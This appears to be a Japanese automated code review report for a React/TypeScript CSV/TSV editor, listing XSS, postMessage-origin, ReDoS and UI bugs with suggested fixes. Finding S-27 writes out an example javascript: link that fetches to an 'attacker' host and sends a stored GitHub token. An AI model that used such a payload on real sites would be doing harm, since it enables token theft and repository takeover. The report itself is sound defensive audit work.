# コードレビューレポート 2026-07-28 — shunjapanes/main

## サマリー

- 実行日時: 2026-07-28 自動レビュー・3エージェント並列
- プロジェクト: TSV/CSVエディタ (React 19 + TypeScript + Vite + Tailwind)
- レビューファイル数: 7件 (App.tsx, bridge.ts, SearchBar.tsx, RibbonToolbar.tsx, sw.js, editor.html, package.json)
- 発見件数: 🔴 Critical 0 / 🟠 High 8 / 🟡 Medium 21 / 🟢 Low 34 = 計63件
- うち新規 [NEW]: **2件** / 継続 [継続]: **61件** / 解消 [FIXED]: **0件**
- 適用済み自動修正: **0件**（src配下に console.log / console.error / debugger 文なし）

### 今回の主な変化

| 変化 | 内容 |
|------|------|
| 🆕 S-27 [NEW] High | sessionStorage の GitHub PAT が既存 S-3 の javascript: XSS と組み合わさると1クリックでトークン漏洩 |
| 🆕 B-22 [NEW] Low | Replace ボタンが毎回 send('search') を先行送信して searchIdx をリセットするため、常に hit[0] が置換される |
| ℹ️ src変更なし | 2026-07-25 以降、src/ への新規コミットなし |

---

## セキュリティ所見

### 🔴 Critical

**（なし）**

---

### 🟠 High

**[NEW] S-27: GitHub PAT (repo スコープ) が sessionStorage に保存されており S-3 の javascript: XSS 経由で1クリック漏洩**
- 場所: `client/public/editor.html:9061` (sessionStorage.setItem), `:7790` (href URL 無検証)
- `sessionStorage.setItem("tsv-editor-debug-memo-pat", pat)` で保存済み PAT が、S-3 の javascript: href XSS と組み合わさり `<a href="javascript:fetch('https://attacker/?t='+sessionStorage.getItem('tsv-editor-debug-memo-pat'))">` のような細工セルを1クリックするだけで外部に送信される。PAT は `repo` スコープのため リポジトリへの書き込みが可能。
- **修正案 (即対応):** ①S-3 を先に修正して javascript: スキームをブロック。②PAT をモジュールスコープの変数に保持してセッションリロードのたびに再入力させる（sessionStorage/localStorage に一切保存しない）。

**[継続] S-2: postMessage targetOrigin が `'*'`（bridge.ts 親→子）**
- 場所: `client/src/lib/bridge.ts:3`
- **修正案:** `postMessage(msg, window.location.origin)`

**[継続] S-3: `<a href>` の URL に `javascript:` スキームを検証しない（XSS）**
- 場所: `client/public/editor.html:7790` — `renderHtmlValue` の isHtml セル処理
- S-27 の前提脆弱性。**修正案:** `const u = new URL(url, location.href); if (!['http:','https:'].includes(u.protocol)) return escHtml(text);`

**[継続] S-5: デバッグ機能 (debugMemo) が本番 UI に露出 — DEV ガードなし**
- 場所: `client/src/components/RibbonToolbar.tsx:196`
- **修正案:** `{import.meta.env.DEV && <RibbonGroup label="デバッグ">...</RibbonGroup>}`

**[継続] S-7: iframe に sandbox 属性なし → フルオリジン信頼**
- 場所: `client/src/App.tsx:141`
- **修正案:** `sandbox="allow-scripts allow-same-origin allow-downloads allow-popups allow-clipboard-read allow-clipboard-write"`

**[継続] B-13: Ctrl+Z/Y が検索 INPUT 欄フォーカス中も editor.html に送信される**
- 場所: `client/src/App.tsx:64`
- **修正案:** `if (tag === 'INPUT' || tag === 'TEXTAREA') return;` を追加。

**[継続] S-24: regex モードで `new RegExp(q)` が無制限実行 → ReDoS**
- 場所: `client/public/editor.html:5919`, `:5931`, `:7170`
- **修正案:** 入力長上限（200文字）＋実行タイムアウト追加。

**[継続] S-25: editor.html の window.parent.postMessage が全て `'*'`**
- 場所: `client/public/editor.html` — 9505, 9539, 9589, 9599, 9609, 9615, 9626, 9630, 9653 行
- **修正案:** `window.parent.postMessage(msg, location.origin)` に統一。

---

### 🟡 Medium

**[継続] Q-N-18: stateSync で省略フィールドが `false` に上書きされる**
- 場所: `client/src/App.tsx` — stateSync ハンドラ
- **修正案:** `msg.verticalHeaderActive ?? DEFAULT_TOGGLES.verticalHeaderActive`

**[継続] S-8: App.tsx message ハンドラが `e.origin` を未検証**
- **修正案:** 先頭に `if (e.origin !== window.location.origin) return;`

**[継続] S-12: editor.html がソースチェックのみで origin 未検証**
- **修正案:** `e.origin` チェックを追加。

**[継続] S-6: `<font color>` 値を介した CSS プロパティインジェクション**
- 場所: `client/public/editor.html:7794`
- **修正案:** `/^(#[0-9a-fA-F]{3,8}|[a-zA-Z]{2,30})$/.test(color)` で検証。

**[継続] S-9: 置換ボタンが search と replaceOne/All を連続 postMessage で競合**
- 場所: `client/src/components/SearchBar.tsx:104,107`

**[継続] S-10: Content-Security-Policy (CSP) の欠如**

**[継続] S-13: Service Worker がキャッシュファーストのためセキュリティパッチを配信不可**

**[継続] S-14: sw.js のフェッチ失敗時に undefined を返しエラーをマスク**
- **修正案:** `return cached || Response.error()`

**[継続] S-15: FileReader でファイルサイズ上限チェックなし**
- **修正案:** `if (file.size > 100 * 1024 * 1024) { setStatus('ファイルが大きすぎます'); return; }`

**[継続] S-18: @babel/core 7.29.0 — GHSA-4x5r-pxfx-6jf8 要確認**
- **修正案:** `cd client && npm audit fix`

**[継続] S-21: サニタイズされていない file.name が postMessage 経由で editor.html に転送される**

**[継続] S-22: SW が GitHub API の GET レスポンスを無制限にキャッシュ**

**[継続] S-23: replaceText が未サニタイズのまま postMessage で editor.html に転送される**

**[継続] S-26: `target="_blank"` に `rel="noopener noreferrer"` がない（タブナッピング）**

**[継続] B-2: searchNext/searchPrev を setTimeout(30ms) で呼び出す競合リスク**

**[継続] B-3: FileReader.result を型確認なしに string キャスト**

**[継続] B-6: SearchBar — externalQuery 同期 useEffect の古い state 参照**

**[継続] B-7: doGotoRow が行番号を文字列のまま送信** — Fix: `send('gotoRow', Number(rowNum))`

**[継続] B-8: FileReader に onerror ハンドラなし** — Fix: `reader.onerror = () => setStatus('ファイル読み込みエラー')`

**[継続] B-10: clearSearch 送信前にデバウンスタイマーがキャンセルされない（X ボタン）**

**[継続] B-12: SearchBar で IME コンポジション中に検索が発火（日本語入力が壊れる）**

**[継続] B-16: Escape キーがデバウンスタイマーをキャンセルしない**

**[継続] B-17: Enter キーが IME コンポジション中に searchNext を発火**

**[継続] Q-2: focusEditor() が空の catch でエラーを握り潰す**

**[継続] Q-3: message ハンドラの型判別に switch が使われていない**

**[継続] Q-5: SearchBar の useEffect に eslint-disable コメント（二重状態管理）**

**[継続] Q-N-13: EditorMessage が全フィールド任意の平坦インターフェース（判別共用体ではない）**

---

### 🟢 Low

**[NEW] B-22: Replace ボタンが毎回 hit[0] を置換（searchIdx リセット問題）**
- 場所: `client/src/components/SearchBar.tsx:104,107`
- 「1件」「全て」ボタンが `send('search', query)` を先行送信するため editor.html 側で searchIdx が 0 にリセットされ、ユーザーが移動済みでも常に hit[0] が置換対象になる。
- **修正案:** Replace ボタンでは `send('search')` を省略し `send('replaceOne', { query, replaceText })` を1メッセージで送信。

**[継続] B-4: FileTabBar タブ本体が `<div>` でキーボード操作不可**

**[継続] B-11: FileTabBar key={i} — タブ削除時に React 差分アルゴリズムが誤認**

**[継続] B-14: マウント直後に空検索クエリが editor.html に送信される**

**[継続] B-15: SearchPrev/Next ボタンがデバウンスをフラッシュせずにナビゲートを送信**

**[継続] B-18: 置換ボタンがデバウンスタイマーをキャンセルせずに置換を送信**

**[継続] B-21: `msg.activeTab` の境界チェックなし** — Fix: `setActiveTab(Math.min(msg.activeTab, msg.tabs.length - 1))`

**[継続] S-4: FileReader.readAsText() エンコーディング引数未指定（Shift-JIS 文字化け）**

**[継続] S-20: SW activate ハンドラが旧バージョンキャッシュを削除しない**

**[継続] Q-N-1 〜 Q-N-17:** 命名・マジックナンバー・アクセシビリティ等の軽微な品質指摘（前回から変化なし）

---

## 適用済み自動修正

```diff
(なし — src配下に console.log / console.error / debugger 文なし)
```

---

## 推奨アクション（優先度順）

1. **[即対応] S-27 (High/NEW):** ①S-3 の javascript: スキーム検証。②PAT をモジュール変数のみに保持して sessionStorage への書き込みを削除。
2. **[即対応] S-5 (High):** デバッググループを `{import.meta.env.DEV && ...}` でガード。
3. **[即対応] B-13 (High):** `if (tag === 'INPUT' || tag === 'TEXTAREA') return;` を追加。
4. **[即対応] Q-N-18 (Medium):** `msg.xxx ?? DEFAULT_TOGGLES.xxx` で undefined→false 誤変換を防ぐ。
5. **[即対応] B-17 / B-12 (Medium):** IME isComposing チェック追加。
6. **[即対応] B-16 (Medium):** Escape ハンドラ先頭に `clearTimeout(debounceRef.current)` を追加。
7. **[今週] S-7 (High):** iframe に sandbox 属性追加。
8. **[今週] S-3 + S-27 (High):** javascript: スキームブロックと PAT メモリ管理。
9. **[今週] S-25 (High):** editor.html postMessage targetOrigin を `location.origin` に変更。
10. **[今週] S-8 (Medium):** App.tsx message ハンドラに origin チェック追加。
11. **[今週] B-22 (Low/NEW):** Replace の send('search') 先行送信を廃止。
12. **[来週] S-24 (High):** ReDoS 対策（入力長上限）。
13. **[来週] S-18 (Medium):** `npm audit fix`。

> 詳細な過去経緯は `_review/2026-07-27_code_review.md` を参照
